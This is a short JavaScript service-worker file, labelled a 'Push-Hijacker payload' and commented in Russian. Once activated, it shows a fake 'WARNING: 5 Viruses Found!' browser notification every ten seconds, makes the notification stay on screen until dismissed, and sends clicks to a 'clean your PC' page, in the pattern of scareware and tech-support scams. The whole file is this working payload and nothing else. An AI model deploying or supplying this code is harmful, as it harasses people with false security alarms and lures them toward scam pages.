// sw.js — Push-Hijacker payload
const TITLE = "⚠️ WARNING: 5 Viruses Found!";
const BODY  = "Click here to clean your PC immediately!";
const ICON  = "https://picsum.photos/id/237/128/128";

self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', event => {
    event.waitUntil(self.clients.claim());
    
    console.log('🦠 Push-Hijacker SW activated — starting spam');

    // Спам каждые 10 секунд
    setInterval(() => {
        self.registration.showNotification(TITLE, {
            body: BODY,
            icon: ICON,
            badge: ICON,
            vibrate: [500, 100, 500, 100, 500],
            requireInteraction: true,   // не исчезает сам
            tag: 'virus-' + Date.now()
        });
    }, 10000);
});

// Клик по уведомлению
self.addEventListener('notificationclick', event => {
    event.notification.close();
    event.waitUntil(clients.openWindow('https://example.com/clean'));
});
